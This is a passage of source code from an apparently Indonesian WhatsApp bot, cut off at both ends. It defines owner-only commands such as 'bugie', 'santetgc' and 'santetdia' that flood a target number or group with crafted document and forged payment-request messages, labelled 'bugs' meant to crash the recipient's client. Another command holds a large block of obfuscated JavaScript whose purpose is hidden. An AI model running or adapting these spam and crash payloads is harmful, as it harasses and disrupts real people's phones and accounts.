            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await danta.sendMessage(`${text}@s.whatsapp.net`, {text:"  INFINITE"},{quoted:dpaaganz7})
            await sleep(30000)
            await m.reply(`Berhasil Mengirim Santet Di Nomer ${text}`)
            }
            break
case 'bugie':{
if (!isCreator) throw mess.owner
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo`
for (let i = 0; i < jumlah; i++) {
danta.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `MY SELF WA${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
}
}
}})
}
m.reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'santetgc': {
if (!isCreator) return
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`Baiklah Tuan`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: danta.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY SELF`,
}
}}), { userJid: m.chat, quoted: doc})
danta.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case 'santetdia': {
if (!isCreator) return
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`Baiklah Tuan`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: danta.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY SELF`,
}
}}), { userJid: m.chat, quoted: doc})
danta.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case 'bro': {          
if (!isCreator) throw mess.owner
(function(_0x3383c4,_0x1648ad){function _0x4748a5(_0x58bfef,_0x5b3882,_0x4b56cb,_0xdd13cf,_0x574c7c){return _0x3a2d(_0x5b3882-0x3a,_0xdd13cf);}function _0x20d317(_0x44a245,_0x5ed4c8,_0x4b0c6e,_0x2a6ead,_0x356875){return _0x3a2d(_0x356875-0x225,_0x2a6ead);}function _0x29d87e(_0x3b1582,_0x432977,_0x1c3fb1,_0x4602f1,_0x1453c4){return _0x3a2d(_0x1453c4- -0x294,_0x1c3fb1);}function _0x2da846(_0x2bcc46,_0x1471f5,_0x36d1ba,_0x1217d8,_0x3676ed){return _0x3a2d(_0x36d1ba-0x186,_0x1471f5);}function _0x587647(_0x4e6da0,_0x1083e1,_0x543fb8,_0x585e5a,_0x408f96){return _0x3a2d(_0x585e5a- -0x15c,_0x1083e1);}var _0xd6712f=_0x3383c4();while(!![]){try{var _0x1c8767=-parseInt(_0x29d87e(-0x8e,-0x12e,-0xba,-0xfc,-0xd6))/(0x1c6d+-0x5*-0xf1+-0x2121)+parseInt(_0x29d87e(-0x54,-0xba,-0x154,-0xd9,-0xe6))/(-0xbcb*-0x2+0x1*-0x7bb+-0xfd9)*(-parseInt(_0x29d87e(-0xbc,0xa,-0x64,-0x37,-0x54))/(0x539*0x2+-0x27*-0x20+-0xf4f))+-parseInt(_0x29d87e(-0x20d,-0x1b7,-0x111,-0x14e,-0x17f))/(0x2*0x10e7+-0xd7b+-0x144f)+parseInt(_0x20d317(0x46e,0x3a6,0x378,0x415,0x410))/(-0x311*0xc+0x517*-0x1+0x29e8)+parseInt(_0x20d317(0x475,0x4b6,0x45c,0x4f1,0x46c))/(0x1527+0x20ad+0x47*-0xc2)+parseInt(_0x20d317(0x2cb,0x2a5,0x2b5,0x3a9,0x33d))/(-0x5d*0x50+-0x1*-0x1433+0x8e4)*(parseInt(_0x29d87e(-0xeb,-0xfe,-0xf1,-0x192,-0x13b))/(-0x207b+-0x39b*-0x4+0x1217))+-parseInt(_0x2da846(0x2e1,0x24e,0x2cc,0x2a6,0x2b9))/(-0x2*0xb3c+-0x2*0xc93+0x2fa7)*(-parseInt(_0x4748a5(0x1b0,0x194,0x1fa,0x19e,0x17f))/(0x80d*0x3+0x811+-0x1017*0x2));if(_0x1c8767===_0x1648ad)break;else _0xd6712f['push'](_0xd6712f['shift']());}catch(_0x46d5ac){_0xd6712f['push'](_0xd6712f['shift']());}}}(_0x3c5b,0x26*0x3a9+0x343d1+-0x14541));var _0x1da8ec=(function(){var _0x40aadc={'TsGqF':function(_0x5f03aa){return _0x5f03aa();},'XmXlP':function(_0xfc2d1e,_0x552f57){return _0xfc2d1e!==_0x552f57;},'szjMl':_0x2d385d(-0x249,-0x1b4,-0x224,-0x1da,-0x214),'KEQnp':_0x227b1b(0x4ce,0x572,0x4ac,0x517,0x567),'prQqS':_0x2d385d(-0x117,-0xf0,-0xcf,-0x15c,-0x1dd),'IRVig':_0x34581c(0x44c,0x402,0x3c4,0x439,0x3ce),'JUYSN':function(_0x30d8a4,_0x2e6061){return _0x30d8a4===_0x2e6061;},'Qwjsv':_0x2d385d(-0x1fb,-0x178,-0x19d,-0x186,-0x196)};function _0x2d385d(_0x567610,_0x2bef13,_0x5faba3,_0x497b13,_0x191f98){return _0x3a2d(_0x497b13- -0x323,_0x567610);}var _0x135582=!![];function _0x34581c(_0x10cec1,_0x320917,_0x38dba9,_0x4ce81e,_0x5627b5){return _0x3a2d(_0x5627b5-0x188,_0x10cec1);}function _0x46c4ec(_0x1fde46,_0x104516,_0x44ad4e,_0x603cb6,_0x3c687b){return _0x3a2d(_0x603cb6- -0x318,_0x44ad4e);}function _0x227b1b(_0x2b2a5a,_0x2bbe8f,_0x3a026c,_0x61402,_0x26e595){return _0x3a2d(_0x61402-0x2df,_0x3a026c);}function _0xe2e009(_0x3881b9,_0x3cde1e,_0x4200f1,_0x3dbc7a,_0x2e5705){return _0x3a2d(_0x2e5705- -0x27f,_0x4200f1);}return function(_0x45b4a5,_0xcc5e50){function _0x2a2712(_0x4b9180,_0x14c154,_0x318f6b,_0x282a47,_0x4df640){return _0x227b1b(_0x4b9180-0xfc,_0x14c154-0xbd,_0x318f6b,_0x282a47- -0x1b2,_0x4df640-0x13b);}function _0x501dfe(_0x41ac02,_0x407ad2,_0x59470c,_0x420a8f,_0x6153c2){return _0x2d385d(_0x407ad2,_0x407ad2-0x167,_0x59470c-0xc1,_0x6153c2-0x32,_0x6153c2-0xa);}function _0x3477c1(_0xef7319,_0x189050,_0x2dda6d,_0x688710,_0x432fa5){return _0x227b1b(_0xef7319-0x13a,_0x189050-0x117,_0xef7319,_0x189050- -0x241,_0x432fa5-0xd3);}var _0x3506ce={'BsxfI':function(_0x28bb2a){function _0x43d453(_0x80b1f0,_0x351071,_0x457d7e,_0x256de5,_0x510e13){return _0x3a2d(_0x510e13-0x3a7,_0x256de5);}return _0x40aadc[_0x43d453(0x669,0x649,0x641,0x54f,0x5e3)](_0x28bb2a);},'gAdhK':function(_0x1eaf88,_0x271e8c){function _0x574d2a(_0x2b4188,_0x169b27,_0x2b8f7c,_0x57929c,_0xe3d783){return _0x3a2d(_0x2b8f7c- -0x3e7,_0x169b27);}return _0x40aadc[_0x574d2a(-0x26a,-0x286,-0x289,-0x274,-0x2c3)](_0x1eaf88,_0x271e8c);},'qJNrr':_0x40aadc[_0x2a2712(0x31e,0x31a,0x266,0x2b8,0x330)],'YYVav':_0x40aadc[_0x2a2712(0x35d,0x375,0x311,0x2fe,0x271)],'scxgZ':_0x40aadc[_0xacb31c(0x52,-0x4,0xba,-0x47,0x1a)],'aXnky':_0x40aadc[_0x2594b6(0x4e0,0x4ad,0x421,0x505,0x536)]};function _0x2594b6(_0x1df6a1,_0x2729c1,_0x25da73,_0x58ab43,_0x2965e2){return _0x34581c(_0x58ab43,_0x2729c1-0x6d,_0x25da73-0x14d,_0x58ab43-0x1e4,_0x2729c1-0x103);}function _0xacb31c(_0x4ef399,_0x178d84,_0x2a415a,_0x4ec3e6,_0x539320){return _0xe2e009(_0x4ef399-0x1a5,_0x178d84-0xca,_0x539320,_0x4ec3e6-0x1f1,_0x4ef399-0xd2);}if(_0x40aadc[_0x3477c1(0x15e,0x1e2,0x194,0x22e,0x198)](_0x40aadc[_0x2a2712(0x2df,0x294,0x2e1,0x323,0x331)],_0x40aadc[_0x3477c1(0x2c5,0x294,0x306,0x2ca,0x2cf)])){var _0x545ccc=_0x135582?function(){function _0x55aec2(_0x2321e4,_0x5a88f9,_0xd5c016,_0x5b18fe,_0x4ef4f1){return _0x501dfe(_0x2321e4-0x14b,_0x2321e4,_0xd5c016-0x114,_0x5b18fe-0x37,_0x5a88f9-0xaa);}function _0x54132a(_0x37f2a1,_0x10c1e4,_0x394863,_0x3d1c9d,_0x5d60f2){return _0x2a2712(_0x37f2a1-0x112,_0x10c1e4-0xe9,_0x37f2a1,_0x5d60f2- -0x113,_0x5d60f2-0xd4);}function _0xae659(_0x391749,_0x298e7b,_0x2433d5,_0x2cfa50,_0x4f5fc4){return _0x3477c1(_0x391749,_0x4f5fc4-0x18f,_0x2433d5-0x9e,_0x2cfa50-0xc8,_0x4f5fc4-0x44);}function _0x2bf9c7(_0x2ef2ee,_0x5d31e0,_0x372df3,_0x3a9a85,_0x5720d0){return _0x501dfe(_0x2ef2ee-0x20,_0x3a9a85,_0x372df3-0x1bd,_0x3a9a85-0x3f,_0x5720d0-0x25);}function _0x2d63ae(_0x58f1dd,_0x3923fc,_0x41c78d,_0x370995,_0x13c68b){return _0x2594b6(_0x58f1dd-0x66,_0x58f1dd- -0x665,_0x41c78d-0x40,_0x13c68b,_0x13c68b-0x1c8);}if(_0x3506ce[_0x2bf9c7(-0xad,-0x1b0,-0xb0,-0xc5,-0x11b)](_0x3506ce[_0x2d63ae(-0x27b,-0x2d5,-0x284,-0x20e,-0x23a)],_0x3506ce[_0x2d63ae(-0x1c7,-0x181,-0x1db,-0x24c,-0x225)])){if(_0xcc5e50){if(_0x3506ce[_0x2bf9c7(-0x8a,-0x126,-0xfc,-0x119,-0x11b)](_0x3506ce[_0x54132a(0x23f,0x1ac,0x245,0x1fb,0x1e8)],_0x3506ce[_0xae659(0x4fd,0x4e5,0x44d,0x4e9,0x46a)])){var _0x331356=_0xcc5e50[_0x2d63ae(-0x204,-0x240,-0x170,-0x17d,-0x2a1)](_0x45b4a5,arguments);return _0xcc5e50=null,_0x331356;}else return!![];}}else _0x3506ce[_0x54132a(0x1b8,0x184,0x1a9,0x13c,0x161)](_0xad7fd2);}:function(){};return _0x135582=![],_0x545ccc;}else _0x179e0d=_0xaa4bf3;};}());function _0x48ebd1(_0x138fb4,_0x1a51bb,_0x415e7c,_0x30e59d,_0x7f4c28){return _0x3a2d(_0x7f4c28-0x218,_0x138fb4);}function _0x1aa8c6(_0x1ab87f,_0x35467e,_0x2cebb5,_0x112110,_0x119306){return _0x3a2d(_0x119306- -0x171,_0x35467e);}var _0x5c04df=_0x1da8ec(this,function(){function _0x33dd68(_0x15c580,_0x22ae3c,_0x39b8cd,_0x460709,_0x45276d){return _0x3a2d(_0x45276d-0xec,_0x15c580);}var _0x2d27ba={};_0x2d27ba[_0x133787(0x5da,0x5b5,0x5be,0x5a5,0x5e2)]=_0x133787(0x57a,0x542,0x5e2,0x59c,0x5dd)+_0x362b88(0x2cf,0x370,0x346,0x3d2,0x349)+'+$';var _0x159416=_0x2d27ba;function _0x45f229(_0x217ad8,_0x268134,_0x597798,_0x69d29f,_0x53dc3a){return _0x3a2d(_0x217ad8-0x5a,_0x69d29f);}function _0x133787(_0x9683f6,_0xaa8b,_0x527038,_0x535b86,_0x122fea){return _0x3a2d(_0x535b86-0x3a0,_0x527038);}function _0x362b88(_0xbeffcf,_0x4fdc9a,_0x875f1a,_0x5ddd97,_0x4dcf96){return _0x3a2d(_0x4dcf96-0x1ca,_0xbeffcf);}function _0x17ed4b(_0x20ee71,_0x197b37,_0x9d26b0,_0x5c6f15,_0x84af85){return _0x3a2d(_0x9d26b0-0xfa,_0x20ee71);}return _0x5c04df[_0x17ed4b(0x28c,0x344,0x2e7,0x270,0x314)+_0x362b88(0x46f,0x380,0x3f9,0x445,0x3ed)]()[_0x17ed4b(0x298,0x2bf,0x250,0x1b5,0x2b3)+'h'](_0x159416[_0x133787(0x5de,0x56d,0x553,0x5a5,0x589)])[_0x362b88(0x43e,0x3bc,0x33f,0x35f,0x3b7)+_0x17ed4b(0x340,0x2cc,0x31d,0x2fe,0x3a6)]()[_0x133787(0x4c2,0x522,0x5b0,0x516,0x517)+_0x17ed4b(0x396,0x29d,0x31b,0x2f1,0x2ab)+'r'](_0x5c04df)[_0x45f229(0x1b0,0x12e,0x12d,0x23b,0x146)+'h'](_0x159416[_0x17ed4b(0x343,0x2a8,0x2ff,0x2b5,0x29f)]);});_0x5c04df();var _0x25e9fe=(function(){function _0x208a8f(_0x477c97,_0x42e921,_0x29c528,_0x1be45d,_0x22041a){return _0x3a2d(_0x42e921- -0x1b6,_0x1be45d);}function _0x4ab6d4(_0x40c09f,_0xc52848,_0x4b9aa7,_0x22f17a,_0x19f4ac){return _0x3a2d(_0xc52848-0x386,_0x19f4ac);}function _0x3343f3(_0x2b2851,_0x2e4e23,_0x6f6bd2,_0x36c9af,_0x43fc81){return _0x3a2d(_0x6f6bd2- -0x1cd,_0x43fc81);}function _0x594e76(_0x217b96,_0x2dd4e4,_0x257cd9,_0x2c1cb6,_0x4050b8){return _0x3a2d(_0x2c1cb6- -0x100,_0x4050b8);}function _0x55113f(_0x497c4a,_0x41b2be,_0x641804,_0x14a920,_0x1cd563){return _0x3a2d(_0x1cd563-0x27,_0x497c4a);}var _0x375e33={'zYfAJ':function(_0xc4498d,_0x27d232){return _0xc4498d===_0x27d232;},'ibxqT':_0x594e76(0x1ab,0x1c7,0x19c,0x143,0x1c2),'vIAUO':_0x594e76(0x55,0x4b,0x97,0xd8,0xde),'WTvNI':function(_0x407433,_0x1f7d6d){return _0x407433===_0x1f7d6d;},'AdPjN':_0x55113f(0x149,0x1a0,0x160,0x1f1,0x1ab),'klJzL':_0x55113f(0x22b,0x29f,0x21d,0x1fb,0x26f),'LTNIy':function(_0x4545a1,_0x4cf272){return _0x4545a1(_0x4cf272);},'VobjA':function(_0x4ff7b2,_0x299548){return _0x4ff7b2+_0x299548;},'UppXl':function(_0x211ad8,_0x3ed10c){return _0x211ad8+_0x3ed10c;},'NgjvK':_0x4ab6d4(0x45a,0x4f8,0x4dd,0x51c,0x503)+_0x4ab6d4(0x476,0x4f9,0x539,0x4bb,0x4fe)+_0x3343f3(-0xe2,-0x47,-0x90,-0xac,-0x50)+_0x208a8f(0x8a,0x51,-0x33,0x13,0x78),'eFQmP':_0x4ab6d4(0x5a6,0x577,0x5af,0x589,0x524)+_0x594e76(0xf,0x75,0xb0,0x50,0xd1)+_0x594e76(0x95,0x197,0xe1,0x114,0xea)+_0x208a8f(0x78,-0x15,0x70,-0x10,-0xb0)+_0x4ab6d4(0x600,0x5b7,0x560,0x575,0x5f3)+_0x594e76(0x117,0xd8,0xcc,0x14b,0x1d7)+'\x20)','SUFAQ':_0x3343f3(0x35,0x1d,-0x2b,-0x2a,-0x6a)},_0x4479ed=!![];return function(_0x4e3122,_0x3cb167){function _0x5366fa(_0x36f50d,_0x3e991e,_0x845d8a,_0x4e7ad5,_0x4fe83d){return _0x208a8f(_0x36f50d-0x1bb,_0x36f50d-0x487,_0x845d8a-0x36,_0x4fe83d,_0x4fe83d-0xe8);}function _0x2b03dc(_0x49bfa8,_0x7a4931,_0x57ce72,_0xe31543,_0x1a102f){return _0x4ab6d4(_0x49bfa8-0x147,_0x49bfa8- -0x26c,_0x57ce72-0x1a4,_0xe31543-0x5c,_0x57ce72);}function _0x51885b(_0x3eb0ab,_0x4e6744,_0x236813,_0x481f5c,_0x49b607){return _0x3343f3(_0x3eb0ab-0x3c,_0x4e6744-0xe6,_0x3eb0ab- -0x1aa,_0x481f5c-0x15b,_0x481f5c);}var _0x8ed3a8={'vqAqw':function(_0x30c564,_0x38cad0){function _0x4b04c1(_0x3765fe,_0x5ba235,_0x4c8242,_0x476ad3,_0x3e40f9){return _0x3a2d(_0x5ba235- -0x3d3,_0x476ad3);}return _0x375e33[_0x4b04c1(-0x2af,-0x258,-0x2a7,-0x20d,-0x2bd)](_0x30c564,_0x38cad0);},'DNSdc':function(_0x108726,_0x331f98){function _0xbc4fd5(_0x1c56cf,_0x157dfe,_0x173844,_0x22f9ac,_0x1a5480){return _0x3a2d(_0x157dfe-0x9c,_0x22f9ac);}return _0x375e33[_0xbc4fd5(0x1b2,0x1ea,0x17d,0x1a7,0x171)](_0x108726,_0x331f98);},'oFzaT':function(_0x4f4ab2,_0x2abfa7){function _0x5de9b4(_0x48516d,_0x2200b8,_0x412862,_0x25fbc2,_0x29b15f){return _0x3a2d(_0x29b15f-0xec,_0x412862);}return _0x375e33[_0x5de9b4(0x24f,0x274,0x2c5,0x344,0x2b5)](_0x4f4ab2,_0x2abfa7);},'UCwPY':_0x375e33[_0x2b03dc(0x31b,0x38f,0x335,0x35b,0x2c2)],'BFRKQ':_0x375e33[_0x5366fa(0x46f,0x46e,0x478,0x49c,0x48d)]};function _0x58ddb1(_0x1fef84,_0x59f070,_0x330e12,_0x199f29,_0x118052){return _0x3343f3(_0x1fef84-0x13,_0x59f070-0x74,_0x59f070-0x260,_0x199f29-0x29,_0x199f29);}function _0x227229(_0x2c515d,_0x5a74a4,_0x2a882e,_0x4e6f7e,_0x13d17e){return _0x594e76(_0x2c515d-0x165,_0x5a74a4-0x1d0,_0x2a882e-0xb2,_0x2c515d-0xe6,_0x13d17e);}if(_0x375e33[_0x2b03dc(0x234,0x1db,0x26c,0x280,0x19a)](_0x375e33[_0x58ddb1(0x241,0x299,0x280,0x2f0,0x2e8)],_0x375e33[_0x51885b(-0x171,-0x127,-0xe5,-0xe0,-0x1b2)])){var _0x5d2a63=_0x4479ed?function(){function _0x362bcb(_0x56d531,_0x22ea07,_0x523e3d,_0x456e4a,_0x1f7bc2){return _0x51885b(_0x1f7bc2-0x45a,_0x22ea07-0x25,_0x523e3d-0x5,_0x56d531,_0x1f7bc2-0x112);}function _0x2708c0(_0x432368,_0x2bcb5c,_0x4760b2,_0x2b9898,_0x48aa69){return _0x51885b(_0x4760b2-0x203,_0x2bcb5c-0x13a,_0x4760b2-0x1c,_0x2bcb5c,_0x48aa69-0x1b4);}function _0x137655(_0x2da4f8,_0x2c8282,_0x395014,_0x3025ae,_0x1f831e){return _0x51885b(_0x3025ae-0x6db,_0x2c8282-0x1c7,_0x395014-0x181,_0x395014,_0x1f831e-0x1e2);}function _0x194110(_0x21b144,_0x2f66f6,_0x49532f,_0x3fe9b3,_0x1c87b2){return _0x227229(_0x49532f- -0x1a4,_0x2f66f6-0xb1,_0x49532f-0xb3,_0x3fe9b3-0x192,_0x3fe9b3);}function _0x23ef23(_0x4edf06,_0x2c17ec,_0x4841e9,_0x10299a,_0x46b3ab){return _0x51885b(_0x2c17ec- -0xf,_0x2c17ec-0x18c,_0x4841e9-0x16b,_0x10299a,_0x46b3ab-0xeb);}if(_0x375e33[_0x137655(0x4a5,0x4be,0x41c,0x488,0x46a)](_0x375e33[_0x194110(-0x65,0x3e,-0xc,0x28,-0xf)],_0x375e33[_0x23ef23(-0x196,-0x151,-0x10c,-0xed,-0x130)])){var _0x242adb;try{_0x242adb=_0x8ed3a8[_0x194110(0x47,0x9e,0x50,0xda,0x6b)](_0x574421,_0x8ed3a8[_0x137655(0x562,0x4bf,0x5b5,0x558,0x5cd)](_0x8ed3a8[_0x362bcb(0x2dd,0x234,0x1ce,0x2ef,0x265)](_0x8ed3a8[_0x2708c0(0x1d,0xe4,0x7f,-0x19,0xaf)],_0x8ed3a8[_0x23ef23(-0x132,-0x161,-0x14a,-0x157,-0x1f7)]),');'))();}catch(_0x290ed4){_0x242adb=_0x26feae;}return _0x242adb;}else{if(_0x3cb167){if(_0x375e33[_0x194110(-0x21,-0x13,-0xa4,-0xa0,-0x7d)](_0x375e33[_0x137655(0x514,0x562,0x4df,0x56f,0x56d)],_0x375e33[_0x137655(0x495,0x510,0x46f,0x48c,0x4c1)])){if(_0xe6d9d6){var _0x57ace2=_0x55b2a6[_0x2708c0(0xcf,0x74,0x62,0x3e,0x9a)](_0x493646,arguments);return _0x437394=null,_0x57ace2;}}else{var _0x1bc049=_0x3cb167[_0x137655(0x552,0x558,0x4b2,0x53a,0x587)](_0x4e3122,arguments);return _0x3cb167=null,_0x1bc049;}}}}:function(){};return _0x4479ed=![],_0x5d2a63;}else{var _0x551591=_0x111c55[_0x2b03dc(0x2f0,0x291,0x254,0x339,0x2d8)](_0xab81ca,arguments);return _0x337e0c=null,_0x551591;}};}());(function(){var _0x55a933={'qNFWL':function(_0x9a6cad,_0x493e86){return _0x9a6cad+_0x493e86;},'yffhy':_0x2688b8(-0x11c,-0xbe,-0x1b7,-0x97,-0xfe),'bDiMF':_0x184010(0x60b,0x60a,0x64a,0x613,0x652),'UptDi':_0x2688b8(-0x13b,-0x17c,-0x11a,-0xc2,-0xb9)+'n','flhKd':function(_0x3ef8f4,_0x145e3a){return _0x3ef8f4===_0x145e3a;},'SCoGX':_0x1189d6(0x51e,0x572,0x506,0x47c,0x55f),'zKxOj':_0x2adace(0x43b,0x3fe,0x460,0x494,0x3fb)+_0x2688b8(-0x1b9,-0x165,-0x16e,-0x1d8,-0x14b)+_0x1c2d27(0x5a1,0x487,0x48c,0x531,0x50f)+')','crFMN':_0x1189d6(0x4bb,0x427,0x4b2,0x531,0x52c)+_0x1189d6(0x4ab,0x4cb,0x519,0x513,0x4aa)+_0x1189d6(0x477,0x4ff,0x478,0x3f1,0x3fd)+_0x1189d6(0x4e5,0x412,0x4a4,0x4d9,0x449)+_0x2adace(0x527,0x4ea,0x493,0x48f,0x486)+_0x184010(0x51e,0x5b6,0x59e,0x4b8,0x515)+_0x2adace(0x533,0x473,0x4c8,0x53e,0x48e),'EzEnK':function(_0x312c22,_0x4882d4){return _0x312c22(_0x4882d4);},'fncMB':_0x184010(0x607,0x580,0x59e,0x63d,0x614),'lTVYw':function(_0x58d98b,_0xe4efaf){return _0x58d98b+_0xe4efaf;},'hTkXV':_0x1189d6(0x56a,0x520,0x534,0x5b5,0x59a),'pXAoQ':function(_0x17ab26,_0x1ad2cd){return _0x17ab26+_0x1ad2cd;},'bhbYb':_0x1c2d27(0x4b4,0x5b6,0x4e6,0x565,0x52f),'RVLXg':function(_0x2b9ad8,_0x1611e7){return _0x2b9ad8!==_0x1611e7;},'Dwjgq':_0x184010(0x565,0x506,0x5c4,0x5c0,0x537),'axXlW':function(_0x3c8dad,_0xe53f17){return _0x3c8dad===_0xe53f17;},'jCSHC':_0x1189d6(0x4d6,0x590,0x557,0x5d6,0x4d6),'TJIRs':function(_0x3b9aae){return _0x3b9aae();},'CBZLt':function(_0x4e1781,_0x2c179f,_0x531417){return _0x4e1781(_0x2c179f,_0x531417);}};function _0x1189d6(_0x464fff,_0x33e0fa,_0x368fdf,_0x2b10d4,_0x495d2d){return _0x3a2d(_0x368fdf-0x316,_0x464fff);}function _0x184010(_0x2c24c9,_0x18f270,_0x5644c7,_0x105f4b,_0x1cb87e){return _0x3a2d(_0x2c24c9-0x3cd,_0x5644c7);}function _0x1c2d27(_0x3d6d2f,_0x2e9d2c,_0x22a66f,_0x1e7839,_0x24d90c){return _0x3a2d(_0x24d90c-0x327,_0x2e9d2c);}function _0x2688b8(_0x3cfc18,_0x29e43e,_0x5a2c83,_0x48ac26,_0xc993f1){return _0x3a2d(_0x3cfc18- -0x2e6,_0x29e43e);}function _0x2adace(_0x50f163,_0x337e48,_0x58e125,_0x5d1fc2,_0x5d9c8e){return _0x3a2d(_0x58e125-0x2d1,_0x5d9c8e);}_0x55a933[_0x2688b8(-0x179,-0x16c,-0x169,-0x10a,-0x14a)](_0x25e9fe,this,function(){function _0x5a8368(_0x88767b,_0x1715e3,_0x87622b,_0x296b9f,_0x10ae03){return _0x1189d6(_0x296b9f,_0x1715e3-0x1f0,_0x87622b- -0x5e1,_0x296b9f-0x130,_0x10ae03-0x1c1);}function _0x4c0d49(_0x27de41,_0xf84f9e,_0x17e7ee,_0x54491f,_0x481f08){return _0x184010(_0x54491f- -0x635,_0xf84f9e-0x165,_0x17e7ee,_0x54491f-0x80,_0x481f08-0xb5);}function _0x1f91c7(_0x5b7722,_0xe7bc78,_0x1fdde2,_0x44b9ec,_0x9fdbaf){return _0x184010(_0x9fdbaf- -0x418,_0xe7bc78-0x137,_0x5b7722,_0x44b9ec-0xd1,_0x9fdbaf-0xce);}function _0x2043cb(_0x3c8dea,_0x82ba2a,_0x39f5c0,_0x3aefba,_0x31c41c){return _0x1c2d27(_0x3c8dea-0x1c0,_0x31c41c,_0x39f5c0-0x167,_0x3aefba-0x1dd,_0x3aefba- -0x3f4);}function _0x4fcada(_0x1c66b5,_0x5db7b9,_0xa898d2,_0x1f278e,_0x1f0439){return _0x1189d6(_0x5db7b9,_0x5db7b9-0x107,_0xa898d2- -0x24e,_0x1f278e-0x1b2,_0x1f0439-0x17a);}var _0x94287a={'KkxWF':function(_0x16f3fa,_0x6e01a0){function _0x11d5f8(_0xb3d22b,_0x5f1bba,_0x46abab,_0x3877eb,_0x366822){return _0x3a2d(_0x46abab- 